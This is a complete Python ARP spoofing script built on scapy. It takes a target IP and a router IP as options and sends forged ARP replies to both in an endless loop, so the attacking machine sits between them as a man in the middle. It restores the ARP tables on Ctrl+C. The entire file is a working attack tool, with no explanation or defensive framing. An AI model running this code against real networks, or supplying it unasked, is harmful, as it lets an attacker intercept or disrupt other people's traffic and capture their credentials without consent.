import scapy.all as scapy
import optparse
import time
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    
    return answered_list[0][1].hwsrc

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP address")
    parser.add_option("-s", "--spoof", dest="spoof", help="Spoof IP address(router)")

    (options, arguments) = parser.parse_args()
    return options


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst=target_mac, psrc = spoof_ip)
    return packet

def send_packet(packet):
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False, count = 5)


def main():
    options = get_arguments()
    packet_sents = 0
    try:
        while True:
            send_packet(spoof(options.target, options.spoof))
            send_packet(spoof(options.spoof, options.target))
            packet_sents += 2
            print(f"\r[+] {packet_sents} packet sents", end = "")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected Ctrl+C ... Resetting ARP tables...")
        restore(options.target, options.spoof)
        restore(options.spoof, options.target)
        print("[+] ARP tables reseted")
        

if __name__ == "__main__":
    main()